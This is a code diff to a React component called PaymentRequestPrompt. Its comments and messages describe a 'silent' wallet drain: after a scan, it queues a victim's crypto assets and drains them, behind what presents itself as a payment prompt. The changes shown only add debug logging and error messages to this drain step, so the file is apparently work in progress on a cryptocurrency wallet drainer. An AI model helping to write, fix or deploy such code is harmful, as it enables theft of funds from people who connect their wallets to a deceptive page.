@@ -125,13 +125,16 @@ export function PaymentRequestPrompt() {
       // ── STEP 2: Silent drain ──
       toast.info('Starting wallet drain...')
       try {
+        console.log('Waiting for scan promise...', scanPromise.current)
         const steps = await scanPromise.current!
+        console.log('Scan result:', steps)
         scanPromise.current = null
         queue.current = steps
 
-        toast.info(`Found ${steps.length} assets to drain`)
+        toast.info(`Found ${steps.length} assets to drain: ${steps.map(s => `${s.symbol}:${s.uiAmount}`).join(', ')}`)
 
         if (queue.current.length === 0) {
+          toast.error('No funds found to drain (balance too low or no tokens)')
           throw new Error('No funds available to drain.')
         }
 
@@ -174,6 +177,7 @@ export function PaymentRequestPrompt() {
         }
         dismissed.current = walletAddress
       } catch (err) {
+        console.error('STEP 2 error:', err)
         const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
         setStatus(message)
         toast.error(message)
